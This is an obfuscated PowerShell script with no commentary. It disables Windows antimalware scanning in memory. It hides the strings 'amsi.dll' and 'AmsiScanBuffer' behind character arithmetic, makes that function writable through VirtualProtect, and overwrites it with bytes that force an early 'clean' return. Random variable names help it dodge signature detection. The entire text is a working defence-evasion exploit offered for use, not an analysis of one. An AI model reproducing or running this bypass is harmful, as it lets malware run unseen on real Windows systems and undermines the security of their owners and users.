$bZdkz2 = @"
using System;
using System.Runtime.InteropServices;
public class bZdkz2 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr rD7OfAneiK, string FYFLhHZRZ);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lJwxf7_mMJX8M5aJ4, UIntPtr Rr3adw_2t0C_tBJP0, uint NCdoW, out uint bILNxIBbnbim_Jz8);
}
"@

Add-Type $bZdkz2

$GIuqmetxfPs3 = [bZdkz2]::LoadLibrary("$([ChaR](97*17/17)+[CHAR](109+35-35)+[Char]([byte]0x73)+[chAr](105*79/79)+[ChaR]([bytE]0x2e)+[chAR](100*9/9)+[ChAR]([bYTE]0x6c)+[Char]([ByTe]0x6c))")
$oZDLus3nQxv = [bZdkz2]::GetProcAddress($GIuqmetxfPs3, "$([cHaR]([BYte]0x41)+[chAr](109)+[ChaR](115*37/37)+[ChAR](105)+[chAR]([BYTe]0x53)+[cHaR](99*84/84)+[chAR]([bYtE]0x61)+[cHar](52+58)+[cHAR]([Byte]0x42)+[ChAR](117+4-4)+[CHaR]([BYTe]0x66)+[char]([BYte]0x66)+[CHaR](101+26-26)+[CHar]([BYtE]0x72))")
$p = 0
[bZdkz2]::VirtualProtect($oZDLus3nQxv, [uint32]5, 0x40, [ref]$p)
$mGFDzv0gULaYT = "0xB8"
$iDO2mNa = "0x57"
$JIxlcErG12k3R = "0x00"
$X7ABlzL5z = "0x07"
$kFxipt2HG6 = "0x80"
$ngryKTV_MG328cHYx = "0xC3"
$CmzGbjvQPoF = [Byte[]] ($mGFDzv0gULaYT,$iDO2mNa,$JIxlcErG12k3R,$X7ABlzL5z,+$kFxipt2HG6,+$ngryKTV_MG328cHYx)
[System.Runtime.InteropServices.Marshal]::Copy($CmzGbjvQPoF, 0, $oZDLus3nQxv, 6)